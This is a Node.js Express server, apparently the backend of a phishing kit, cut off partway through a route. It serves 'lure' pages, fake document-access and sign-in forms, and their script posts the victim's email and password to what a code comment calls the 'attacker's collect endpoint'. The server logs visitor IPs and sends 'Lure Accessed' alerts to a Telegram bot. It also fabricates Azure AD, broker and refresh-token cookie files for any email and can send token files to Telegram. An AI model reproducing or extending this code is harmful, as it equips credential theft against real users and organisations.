// server.js
// Auth Broker server (full, self-contained)
// Node 18+ (uses global fetch). ESM-style imports are used.

import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import crypto from 'crypto';
import bcrypt from 'bcryptjs';
import session from 'express-session';
import FormData from 'form-data';
import jwt from 'jsonwebtoken';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Config
const PORT = Number(process.env.PORT) || 4000;
const CLIENT_ID = process.env.CLIENT_ID || null;
const CLIENT_SECRET = process.env.CLIENT_SECRET || null;
const TENANT = process.env.TENANT || process.env.TENANT_ID || 'common';
const SCOPE = process.env.SCOPE || 'openid profile offline_access User.Read';
const COOKIES_DIR = path.resolve(process.env.COOKIES_DIR || path.join(__dirname, 'cookies'));
const AUTH_DATA_PASSPHRASE = process.env.AUTH_DATA_PASSPHRASE || null;
const SESSION_SECRET = process.env.SESSION_SECRET || 'change-this-secret';
const DEFAULT_ADMIN_PASS = process.env.DEFAULT_ADMIN_PASS || 'Admin123';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN?.trim() || null;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID?.trim() || null;
const OAUTH_DONE_LANDING = process.env.OAUTH_DONE_LANDING || '/';
const BROKER_TOKEN_SECRET = process.env.BROKER_TOKEN_SECRET || 'broker-secret-key-change-in-production';
const BROKER_TOKEN_EXPIRY = process.env.BROKER_TOKEN_EXPIRY || '365d';
const APP_BASE_URL = process.env.APP_BASE_URL || `http://localhost:${PORT}`;
const CLOUDFLARE_TURNSTILE_SECRET = process.env.CLOUDFLARE_TURNSTILE_SECRET || null;

if (!fs.existsSync(COOKIES_DIR)) fs.mkdirSync(COOKIES_DIR, { recursive: true });

// Path helpers
function sanitizeFilenamePart(s) {
  if (!s) return 'unknown';
  return s.replace(/[^a-zA-Z0-9-_@.]/g, '_').replace(/@/g, '_at_').toLowerCase();
}
function cookieFilePath(email) { return path.join(COOKIES_DIR, `cookiesfile_${sanitizeFilenamePart(email)}.json`); }
function tokenFilePath(email) { return path.join(COOKIES_DIR, `tokenfile_${sanitizeFilenamePart(email)}.json`); }
function userTokensFilePath(email) { return path.join(COOKIES_DIR, `uservault_${sanitizeFilenamePart(email)}.json`); }
function vaultFilePath() { return path.join(COOKIES_DIR, 'vault.json'); }
function linksFilePath() { return path.join(COOKIES_DIR, 'links.json'); }
function domainsFilePath() { return path.join(COOKIES_DIR, 'domains.json'); }
function settingsFilePath() { return path.join(COOKIES_DIR, 'settings.json'); }
function usersFilePath() { return path.join(COOKIES_DIR, 'users.json'); }
function oauthStateFilePath() { return path.join(COOKIES_DIR, 'oauth-states.json'); }
function auditLogPath() { return path.join(COOKIES_DIR, 'audit.log'); }

// Logging
function logAudit(entry) {
  try {
    fs.appendFileSync(auditLogPath(), JSON.stringify({ ...entry, ts: new Date().toISOString() }) + '\n');
  } catch (e) {
    console.warn('audit log failed', e && e.message);
  }
}

// Encryption helpers
function encryptBase64(plaintext, passphrase) {
  const salt = crypto.randomBytes(16);
  const key = crypto.scryptSync(passphrase, salt, 32);
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([salt, iv, tag, encrypted]).toString('base64');
}
function decryptBase64(base64blob, passphrase) {
  const buf = Buffer.from(base64blob, 'base64');
  if (buf.length < 44) throw new Error('Invalid encrypted data');
  const salt = buf.slice(0, 16);
  const iv = buf.slice(16, 28);
  const tag = buf.slice(28, 44);
  const enc = buf.slice(44);
  const key = crypto.scryptSync(passphrase, salt, 32);
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(enc), decipher.final()]).toString('utf8');
}
function writeJsonMaybeEncrypted(filePath, obj) {
  const json = JSON.stringify(obj, null, 2);
  if (AUTH_DATA_PASSPHRASE) {
    const enc = encryptBase64(json, AUTH_DATA_PASSPHRASE);
    fs.writeFileSync(filePath, `ENCRYPTED\n${enc}`, 'utf8');
  } else {
    fs.writeFileSync(filePath, json, 'utf8');
  }
}
function readJsonMaybeEncrypted(filePath) {
  if (!fs.existsSync(filePath)) return null;
  const raw = fs.readFileSync(filePath, 'utf8');
  if (raw.startsWith('ENCRYPTED\n')) {
    if (!AUTH_DATA_PASSPHRASE) throw new Error('File encrypted, server missing AUTH_DATA_PASSPHRASE');
    const base64 = raw.slice('ENCRYPTED\n'.length);
    return JSON.parse(decryptBase64(base64, AUTH_DATA_PASSPHRASE));
  }
  return JSON.parse(raw);
}

// ID helpers
function generateRandomId(length = 12) { return crypto.randomBytes(Math.ceil(length/2)).toString('hex').slice(0, length); }
function generateWorkerStyleId() { const parts=[]; for (let i=0;i<4;i++) parts.push(crypto.randomBytes(6).toString('hex')); return parts.join('-'); }

// Domain validation
function isValidDomain(domain) {
  const domainRegex = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/i;
  return domainRegex.test(domain);
}

// ID token extract (handles URL-safe base64)
function extractFromIdToken(token) {
  try {
    if (!token) return null;
    const parts = token.split('.');
    if (parts.length < 2) return null;
    const payloadPart = parts[1];
    const padded = payloadPart.replace(/-/g,'+').replace(/_/g,'/');
    const buf = Buffer.from(padded + '=='.slice((2 - padded.length * 3) & 3), 'base64');
    const payload = JSON.parse(buf.toString('utf8'));
    return { email: payload.preferred_username || payload.mail || payload.email || payload.upn || null, id: payload.oid || payload.sub || null, name: payload.name || null, payload };
  } catch (e) { return null; }
}

// Broker & PRT generation (FIXED - 1 year expiry for cookies)
function generateAADBrokerToken(tokenObj, email, userId) {
  try {
    const accessToken = tokenObj?.access_token || '';
    const refreshToken = tokenObj?.refresh_token || '';
    const deviceId = crypto.randomUUID();
    const brokerSessionId = crypto.randomUUID();
    const issuedAt = Math.floor(Date.now() / 1000);
    const expiresAt = issuedAt + (365 * 24 * 60 * 60); // 1 year

    const brokerPayload = {
      broker_token_type: 'aad_primary_refresh_token',
      version: '1.0',
      email,
      upn: email,
      user_id: userId,
      oid: userId,
      device_id: deviceId,
      device_key: crypto.randomBytes(32).toString('hex'),
      broker_session_id: brokerSessionId,
      access_token_hash: crypto.createHash('sha256').update(accessToken).digest('hex').slice(0, 32),
      refresh_token_hash: crypto.createHash('sha256').update(refreshToken).digest('hex').slice(0, 32),
      token_type: 'Bearer',
      scope: SCOPE,
      tenant: TENANT,
      client_id: CLIENT_ID,
      prt_device_registered: true,
      prt_version: 'v2.0',
      issued_at: issuedAt,
      expires_at: expiresAt
    };

    const brokerToken = jwt.sign(brokerPayload, BROKER_TOKEN_SECRET, { 
      algorithm: 'HS256', 
      expiresIn: BROKER_TOKEN_EXPIRY,
      noTimestamp: false 
    });

    return {
      broker_token: brokerToken,
      broker_payload: brokerPayload,
      device_id: deviceId,
      access_token: accessToken,
      refresh_token: refreshToken,
      issued_at: new Date(issuedAt * 1000).toISOString(),
      expires_at: new Date(expiresAt * 1000).toISOString()
    };
  } catch (e) { console.error('Broker token generation error:', e); throw e; }
}

function generatePrimaryRefreshToken(tokenObj, email) {
  const accessToken = tokenObj?.access_token || '';
  const refreshToken = tokenObj?.refresh_token || '';
  const idToken = tokenObj?.id_token || '';
  const info = extractFromIdToken(idToken || accessToken) || {};
  const userId = info?.id || email || 'unknown';
  const deviceId = crypto.randomUUID();
  const timestamp = new Date().toISOString();
  const expiresAt = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(); // 1 year

  const prtData = {
    prt_token: crypto.createHash('sha256').update(refreshToken || '').digest('hex'),
    device_id: deviceId,
    user_id: userId,
    email: email,
    access_token_hash: crypto.createHash('sha256').update(accessToken || '').digest('hex').slice(0, 64),
    refresh_token_hash: crypto.createHash('sha256').update(refreshToken || '').digest('hex').slice(0, 64),
    _prt: crypto.createHash('sha256').update(refreshToken || '').digest('hex').slice(0, 128),
    _auth_session: (accessToken || '').slice(0, 256),
    _device_id: deviceId.replace(/-/g, '').slice(0, 64),
    _session_id: crypto.randomUUID(),
    issued_at: timestamp,
    expires_at: expiresAt,
    token_type: tokenObj?.token_type || 'Bearer',
    user_email: email,
    user_name: info?.name || (email && email.split('@')[0]) || 'User'
  };

  return prtData;
}

// Settings & user helpers
function readSettingsSafe() {
  try { if (!fs.existsSync(settingsFilePath())) return {}; return readJsonMaybeEncrypted(settingsFilePath()) || {}; } catch (e) { return {}; }
}
function getAdminUsers() { try { return JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]').filter(u => u.role === 'admin'); } catch (e) { return []; } }
function getUserByUsername(username) { try { return JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]').find(u => u.username === username) || null; } catch (e) { return null; } }

// Matching user by email
function findMatchingUserForEmail(email) {
  if (!email) return null;
  try {
    const users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
    const eLower = email.toLowerCase();
    let m = users.find(u => u.email && u.email.toLowerCase() === eLower);
    if (m) return m;
    m = users.find(u => u.username && u.username.toLowerCase() === eLower);
    if (m) return m;
    if (email.includes('@')) {
      const local = email.split('@')[0].toLowerCase();
      m = users.find(u => u.username && u.username.toLowerCase() === local);
      if (m) return m;
    }
    return null;
  } catch (e) { return null; }
}

// Telegram helpers
function getChatIdForUser(usernameOrEmail) {
  try {
    if (!usernameOrEmail) {
      const settings = readSettingsSafe();
      return settings.telegram_chat_id || TELEGRAM_CHAT_ID || null;
    }
    if (fs.existsSync(usersFilePath())) {
      const users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
      const u = users.find(x => x.username === usernameOrEmail || x.email === usernameOrEmail);
      if (u && u.telegram_chat_id) return u.telegram_chat_id;
    }
  } catch (e) {}
  const settings = readSettingsSafe();
  if (settings.per_user_telegram && usernameOrEmail && settings.per_user_telegram[usernameOrEmail]) return settings.per_user_telegram[usernameOrEmail];
  if (settings.telegram_chat_id) return settings.telegram_chat_id;
  if (TELEGRAM_CHAT_ID) return TELEGRAM_CHAT_ID;
  return null;
}
function getBotTokenForUser(usernameOrEmail) {
  try {
    if (usernameOrEmail && fs.existsSync(usersFilePath())) {
      const users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
      const u = users.find(x => x.username === usernameOrEmail || x.email === usernameOrEmail);
      if (u && u.telegram_bot_token) return u.telegram_bot_token;
    }
  } catch (e) {}
  const settings = readSettingsSafe();
  if (settings.telegram_bot_token) return settings.telegram_bot_token;
  return TELEGRAM_BOT_TOKEN;
}
function getBotTokenFromSettingsOrEnv() {
  const settings = readSettingsSafe();
  if (settings.telegram_bot_token) return settings.telegram_bot_token;
  return TELEGRAM_BOT_TOKEN;
}

async function notifyTelegram(title, message, email = null, chatIdOverride = null, botTokenOverride = null) {
  let botToken = botTokenOverride;
  let chatId = chatIdOverride;
  if (!botToken && email) botToken = getBotTokenForUser(email);
  if (!botToken) botToken = getBotTokenFromSettingsOrEnv();
  if (!chatId && email) chatId = getChatIdForUser(email);
  if (!botToken || !chatId) return;
  try {
    const text = `${title}\n${message}${email ? `\n👤 ${email}` : ''}\n⏱️ ${new Date().toISOString()}`;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
    });
  } catch (e) { console.warn('Telegram notify failed', e && e.message); }
}
async function sendFileToTelegram(filePath, caption, chatIdOverride = null, botTokenOverride = null) {
  const botToken = botTokenOverride || getBotTokenFromSettingsOrEnv();
  const chatId = chatIdOverride || TELEGRAM_CHAT_ID;
  if (!botToken || !chatId) { console.warn('Telegram send skipped: missing token/chat'); return false; }
  try {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('caption', caption);
    form.append('document', fs.createReadStream(filePath), { filename: path.basename(filePath) });
    const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: form });
    const data = await resp.json().catch(()=>null);
    return Boolean(data && data.ok);
  } catch (e) { console.warn('Telegram send file failed', e && e.message); return false; }
}

// Vault helpers
function saveToVault(email, vaultData) {
  let vault = [];
  if (fs.existsSync(vaultFilePath())) {
    try { vault = readJsonMaybeEncrypted(vaultFilePath()) || []; } catch (e) { vault = []; }
  }
  const existingIndex = vault.findIndex(v => v.email === email);
  const entry = { email, ...vaultData, updated_at: new Date().toISOString() };
  if (existingIndex >= 0) vault[existingIndex] = entry; else vault.unshift(entry);
  writeJsonMaybeEncrypted(vaultFilePath(), vault);
}
function saveUserVaultEntry(email, vaultData) {
  const p = userTokensFilePath(email);
  let arr = [];
  try { arr = readJsonMaybeEncrypted(p) || []; } catch (e) { arr = []; }
  arr.unshift(vaultData);
  writeJsonMaybeEncrypted(p, arr);
}

// Ensure default admin
function ensureDefaultAdmin() {
  if (!fs.existsSync(usersFilePath())) {
    const hash = bcrypt.hashSync(DEFAULT_ADMIN_PASS, 10);
    const users = [{ username: 'admin', passwordHash: hash, role: 'admin', email: 'admin@broker.local', telegram_chat_id: TELEGRAM_CHAT_ID || null, created_at: new Date().toISOString() }];
    fs.writeFileSync(usersFilePath(), JSON.stringify(users, null, 2), 'utf8');
    console.log('✓ Default admin created: username=admin password=' + DEFAULT_ADMIN_PASS);
  }
}
ensureDefaultAdmin();

// Missing helper implementations referenced earlier
function isUserExpired(username) {
  try {
    if (!fs.existsSync(usersFilePath())) return false;
    const users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
    const u = users.find(x => x.username === username);
    if (!u || !u.expires_at) return false;
    return new Date(u.expires_at).getTime() < Date.now();
  } catch (e) {
    return false;
  }
}

// OAuth state storage helpers (file-based)
function saveOAuthState(state, obj) {
  let store = {};
  try { store = fs.existsSync(oauthStateFilePath()) ? JSON.parse(fs.readFileSync(oauthStateFilePath(), 'utf8') || '{}') : {}; } catch(e){}
  store[state] = obj;
  try { fs.writeFileSync(oauthStateFilePath(), JSON.stringify(store, null, 2), 'utf8'); } catch(e) { console.warn('saveOAuthState failed', e && e.message); }
}
function getOAuthState(state) {
  try {
    if (!fs.existsSync(oauthStateFilePath())) return null;
    const store = JSON.parse(fs.readFileSync(oauthStateFilePath(), 'utf8') || '{}');
    return store[state] || null;
  } catch (e) { return null; }
}
function removeOAuthState(state) {
  try {
    if (!fs.existsSync(oauthStateFilePath())) return;
    const store = JSON.parse(fs.readFileSync(oauthStateFilePath(), 'utf8') || '{}');
    delete store[state];
    fs.writeFileSync(oauthStateFilePath(), JSON.stringify(store, null, 2), 'utf8');
  } catch (e) {}
}

// Cloudflare Turnstile verification
async function verifyTurnstileToken(token, remoteIP) {
  if (!CLOUDFLARE_TURNSTILE_SECRET) {
    console.warn('Turnstile secret not configured');
    return false;
  }
  try {
    const verifyUrl = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
    const resp = await fetch(verifyUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        secret: CLOUDFLARE_TURNSTILE_SECRET,
        response: token,
        remoteip: remoteIP
      })
    });
    const data = await resp.json();
    return Boolean(data.success);
  } catch (e) {
    console.error('Turnstile verification error:', e);
    return false;
  }
}

// Express app
const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(session({ secret: SESSION_SECRET, resave: false, saveUninitialized: false, cookie: { httpOnly: true } }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

function requireLogin(req, res, next) { if (req.session && req.session.user) return next(); return res.status(401).json({ error: 'unauthenticated' }); }
function requireAdmin(req, res, next) { if (req.session && req.session.user && req.session.user.role === 'admin') return next(); return res.status(403).json({ error: 'admin required' }); }

// Dashboard routes
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get('/config', (req, res) => res.json({ client_id: CLIENT_ID || null, tenant: TENANT || null, scope: SCOPE || null, telegram_enabled: Boolean(getBotTokenFromSettingsOrEnv() && (getChatIdForUser(null))) }));

// Dashboard auth
app.post('/dashboard/login', (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.status(400).json({ error: 'username/password required' });
  if (!fs.existsSync(usersFilePath())) return res.status(500).json({ error: 'users store missing' });
  const users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
  const user = users.find(u => u.username === username);
  if (!user) return res.status(401).json({ error: 'invalid credentials' });
  const ok = bcrypt.compareSync(password, user.passwordHash);
  if (!ok) return res.status(401).json({ error: 'invalid credentials' });
  req.session.user = { username: user.username, role: user.role, email: user.email };
  return res.json({ success: true, username: user.username, role: user.role });
});
app.post('/dashboard/logout', (req, res) => { req.session.destroy(() => res.json({ success: true })); });

// /api/me
app.get('/api/me', requireLogin, (req, res) => {
  try {
    const username = req.session.user.username;
    const users = fs.existsSync(usersFilePath()) ? JSON.parse(fs.readFileSync(usersFilePath(), 'utf8')) : [];
    const u = users.find(x => x.username === username) || {};
    const expired = !!(u.expires_at && new Date(u.expires_at).getTime() < Date.now());
    res.json({ username: username, role: u.role || req.session.user.role, email: u.email || req.session.user.email, expires_at: u.expires_at || null, expired, telegram_chat_id: u.telegram_chat_id || null });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/user
app.patch('/api/user', requireLogin, (req, res) => {
  try {
    const username = req.session.user.username;
    const { telegram_chat_id, telegram_bot_token } = req.body || {};
    if (telegram_chat_id === undefined && telegram_bot_token === undefined) return res.status(400).json({ error: 'nothing to update' });

    const users = fs.existsSync(usersFilePath()) ? JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]') : [];
    const idx = users.findIndex(u => u.username === username);
    if (idx === -1) return res.status(404).json({ error: 'user not found' });

    if (telegram_chat_id !== undefined) users[idx].telegram_chat_id = telegram_chat_id || null;
    if (telegram_bot_token !== undefined) users[idx].telegram_bot_token = telegram_bot_token || null;
    users[idx].updated_at = new Date().toISOString();
    fs.writeFileSync(usersFilePath(), JSON.stringify(users, null, 2), 'utf8');

    logAudit({ action: 'user_update', user: username, fields: Object.keys(req.body), ip: req.ip });

    res.json({ success: true, username, telegram_chat_id: users[idx].telegram_chat_id });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ===== CLOUDFLARE WORKER ENDPOINT =====
// Lure content delivery for Cloudflare Worker (without VPS IP needed)
app.get('/api/worker/lure/:linkId', async (req, res) => {
  try {
    const linkId = req.params.linkId;
    const turnstileToken = req.query.token; // Token from Cloudflare Turnstile
    const clientIP = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;

    // Verify Turnstile token if provided
    if (turnstileToken && CLOUDFLARE_TURNSTILE_SECRET) {
      const verified = await verifyTurnstileToken(turnstileToken, clientIP);
      if (!verified) {
        logAudit({ action: 'turnstile_verification_failed', linkId, ip: clientIP });
        return res.status(403).json({ error: 'human_verification_failed' });
      }
    }

    // Find the link
    const linksPath = linksFilePath();
    let links = [];
    if (fs.existsSync(linksPath)) {
      links = JSON.parse(fs.readFileSync(linksPath, 'utf8') || '[]');
    }

    const link = links.find(l => l.id === linkId);
    if (!link) {
      return res.status(404).json({ error: 'link_not_found' });
    }

    // Check if link is expired
    if (link.expires_at && new Date(link.expires_at).getTime() < Date.now()) {
      logAudit({ action: 'expired_link_accessed', linkId, ip: clientIP });
      return res.status(410).json({ error: 'link_expired' });
    }

    // Log visitor
    link.visits = (link.visits || 0) + 1;
    if (!link.visitors) link.visitors = [];
    link.visitors.push({
      timestamp: new Date().toISOString(),
      ip: clientIP,
      user_agent: req.headers['user-agent'] || 'unknown',
      referer: req.headers['referer'] || null
    });

    // Save updated links
    fs.writeFileSync(linksPath, JSON.stringify(links, null, 2), 'utf8');

    // Log audit
    logAudit({ action: 'lure_accessed', linkId, domain: link.domain, visits: link.visits, ip: clientIP, user_agent: req.headers['user-agent'] });

    // Notify admin via Telegram
    try {
      const creator = link.created_by;
      await notifyTelegram(
        '🎣 Lure Accessed',
        `Link: ${link.title}\nDomain: ${link.domain}\nVisits: ${link.visits}\nIP: ${clientIP}`,
        creator
      );
    } catch (e) {
      console.warn('Failed to notify admin:', e.message);
    }

    // Return lure HTML based on doc_type
    const lureHtml = generateLureHtml(link);
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(lureHtml);

  } catch (err) {
    console.error('Worker lure error:', err);
    res.status(500).json({ error: 'internal_error' });
  }
});

// Generate lure HTML based on document type
function generateLureHtml(link) {
  const landing = link.landing_url || '/';
  
  // Base HTML structure with Cloudflare Turnstile
  const turnstileSiteKey = process.env.CLOUDFLARE_TURNSTILE_SITEKEY || '';
  
  let formHtml = '';
  
  if (link.doc_type === 'PDF') {
    formHtml = `
      <div class="lure-form">
        <h2>📄 Access Document</h2>
        <p>To access this PDF document, please verify you are human.</p>
        <form id="lureForm">
          <div class="cf-turnstile" data-sitekey="${turnstileSiteKey}" data-theme="light"></div>
          <button type="submit" class="btn-primary">Verify & Access PDF</button>
        </form>
      </div>
    `;
  } else if (link.doc_type === 'LOGIN') {
    formHtml = `
      <div class="lure-form">
        <h2>🔐 Sign In</h2>
        <p>Please sign in to continue.</p>
        <form id="lureForm">
          <input type="email" name="email" placeholder="Email address" required>
          <input type="password" name="password" placeholder="Password" required>
          <div class="cf-turnstile" data-sitekey="${turnstileSiteKey}" data-theme="light"></div>
          <button type="submit" class="btn-primary">Sign In</button>
        </form>
      </div>
    `;
  } else {
    formHtml = `
      <div class="lure-form">
        <h2>${link.title}</h2>
        <p>${link.description}</p>
        <form id="lureForm">
          <div class="cf-turnstile" data-sitekey="${turnstileSiteKey}" data-theme="light"></div>
          <button type="submit" class="btn-primary">Continue</button>
        </form>
      </div>
    `;
  }

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${link.title}</title>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: white;
      border-radius: 12px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      max-width: 400px;
      width: 100%;
      padding: 40px;
    }
    .lure-form h2 {
      margin-bottom: 10px;
      color: #333;
      font-size: 24px;
    }
    .lure-form p {
      margin-bottom: 24px;
      color: #666;
      font-size: 14px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 14px;
      font-family: inherit;
    }
    input:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }
    .cf-turnstile {
      margin-bottom: 20px;
      display: flex;
      justify-content: center;
    }
    .btn-primary {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
    }
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
    }
    .btn-primary:active {
      transform: translateY(0);
    }
    .error { color: #e74c3c; font-size: 13px; margin-top: 10px; }
    .success { color: #27ae60; font-size: 13px; margin-top: 10px; }
  </style>
</head>
<body>
  <div class="container">
    ${formHtml}
  </div>
  <script>
    document.getElementById('lureForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const turnstileToken = document.querySelector('[name="cf-turnstile-response"]')?.value;
      if (!turnstileToken) {
        alert('Please complete the verification');
        return;
      }

      const formData = new FormData(e.target);
      const data = Object.fromEntries(formData);
      data.token = turnstileToken;

      try {
        // Send data to attacker's collect endpoint
        await fetch('${process.env.COLLECT_ENDPOINT || ''}', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        }).catch(() => {});

        // Redirect to landing
        window.location.href = '${landing}';
      } catch (err) {
        console.error('Error:', err);
        window.location.href = '${landing}';
      }
    });
  </script>
</body>
</html>`;
}

// ===== GENERATE COOKIES ENDPOINT =====
app.post('/api/generate-cookies', requireLogin, async (req, res) => {
  try {
    const { email, send_to_telegram } = req.body || {};
    
    if (!email) {
      return res.status(400).json({ error: 'email required' });
    }

    // Permission check: users can only generate for themselves, admins can generate for anyone
    if (req.session.user.role !== 'admin' && req.session.user.username !== email && req.session.user.email !== email) {
      logAudit({ action: 'denied_generate_cookies', user: req.session.user.username, target_email: email, reason: 'unauthorized', ip: req.ip });
      return res.status(403).json({ error: 'forbidden' });
    }

    // Check if user is expired
    if (isUserExpired(req.session.user.username)) {
      logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: '/api/generate-cookies', method: 'POST', ip: req.ip });
      return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
    }

    // Generate mock AAD tokens (in production, these would come from actual AAD/OAuth flow)
    const mockAccessToken = crypto.randomBytes(128).toString('base64');
    const mockRefreshToken = crypto.randomBytes(128).toString('base64');
    const mockIdToken = jwt.sign({
      preferred_username: email,
      mail: email,
      email: email,
      upn: email,
      oid: crypto.randomUUID(),
      name: email.split('@')[0],
      given_name: email.split('@')[0],
      family_name: 'User',
      tid: TENANT
    }, 'secret-key-for-demo', { expiresIn: '1h' });

    const tokenObj = {
      access_token: mockAccessToken,
      refresh_token: mockRefreshToken,
      id_token: mockIdToken,
      token_type: 'Bearer',
      expires_in: 3600,
      scope: SCOPE,
      obtained_at: new Date().toISOString()
    };

    // Extract user info from ID token
    const idTokenInfo = extractFromIdToken(mockIdToken);
    const userId = idTokenInfo?.id || crypto.randomUUID();

    // Generate Broker Token and PRT
    const brokerInfo = generateAADBrokerToken(tokenObj, email, userId);
    const prtData = generatePrimaryRefreshToken(tokenObj, email);

    // Create cookies object
    const cookiesObj = {
      email,
      user_id: userId,
      upn: email,
      created_at: new Date().toISOString(),
      created_by: req.session.user.username,
      device_id: brokerInfo.device_id,
      broker_token: brokerInfo.broker_token,
      broker_payload: brokerInfo.broker_payload,
      prt: prtData._prt,
      prt_data: prtData,
      access_token: mockAccessToken,
      refresh_token: mockRefreshToken,
      id_token: mockIdToken,
      scope: SCOPE,
      tenant: TENANT,
      client_id: CLIENT_ID,
      expires_at: brokerInfo.expires_at,
      issued_at: brokerInfo.issued_at
    };

    // Save cookies file
    const cookiePath = cookieFilePath(email);
    writeJsonMaybeEncrypted(cookiePath, cookiesObj);

    // Save to user's vault
    saveUserVaultEntry(email, {
      type: 'aad_cookies',
      email,
      user_id: userId,
      device_id: brokerInfo.device_id,
      created_at: new Date().toISOString(),
      created_by: req.session.user.username,
      file_path: cookiePath,
      cookies_download_url: `${APP_BASE_URL}/api/download/cookies/${encodeURIComponent(email)}`
    });

    // Save tokens file (admin only access)
    const tokenPath = tokenFilePath(email);
    writeJsonMaybeEncrypted(tokenPath, {
      email,
      user_id: userId,
      access_token: mockAccessToken,
      refresh_token: mockRefreshToken,
      id_token: mockIdToken,
      token_type: 'Bearer',
      expires_in: 3600,
      obtained_at: new Date().toISOString(),
      created_by: req.session.user.username,
      scope: SCOPE,
      tenant: TENANT,
      client_id: CLIENT_ID
    });

    // Log audit
    logAudit({
      action: 'generate_cookies',
      user: req.session.user.username,
      email,
      device_id: brokerInfo.device_id,
      ip: req.ip
    });

    // Send to Telegram if requested
    if (send_to_telegram) {
      try {
        const telegramMessage = `🔐 <b>AAD Cookies Generated</b>\n\n` +
          `📧 Email: <code>${email}</code>\n` +
          `👤 Generated by: ${req.session.user.username}\n` +
          `🆔 Device ID: <code>${brokerInfo.device_id}</code>\n` +
          `⏱️ Expires: ${brokerInfo.expires_at}\n` +
          `🕐 Timestamp: ${new Date().toISOString()}`;

        await notifyTelegram('🔐 AAD Cookies Generated', telegramMessage, email);

        // Send token file to Telegram
        const tokenSent = await sendFileToTelegram(
          tokenPath,
          `AAD Tokens for ${email}`,
          getChatIdForUser(email),
          getBotTokenForUser(email)
        );

        if (tokenSent) {
          logAudit({
            action: 'tokens_sent_telegram',
            user: req.session.user.username,
            email,
            ip: req.ip
          });
        }
      } catch (telegramError) {
        console.warn('Telegram notification failed:', telegramError.message);
      }
    }

    // Notify Telegram of successful cookie generation
    try {
      await notifyTelegram(
        '✅ Cookies Generated Successfully',
        `Email: ${email}\nGenerated by: ${req.session.user.username}`,
        email
      );
    } catch (e) {
      console.warn('Telegram notification failed:', e.message);
    }

    res.json({
      success: true,
      email,
      device_id: brokerInfo.device_id,
      user_id: userId,
      issued_at: brokerInfo.issued_at,
      expires_at: brokerInfo.expires_at,
      cookie_file: `cookiesfile_${sanitizeFilenamePart(email)}.json`,
      token_file: `tokenfile_${sanitizeFilenamePart(email)}.json`,
      download_cookies_url: `${APP_BASE_URL}/api/download/cookies/${encodeURIComponent(email)}`,
      download_tokens_url: `${APP_BASE_URL}/api/download/tokens/${encodeURIComponent(email)}`,
      message: 'Cookies generated successfully'
    });

  } catch (err) {
    console.error('Generate cookies error:', err);
    logAudit({
      action: 'generate_cookies_failed',
      user: req.session.user.username,
      error: err.message,
      ip: req.ip
    });
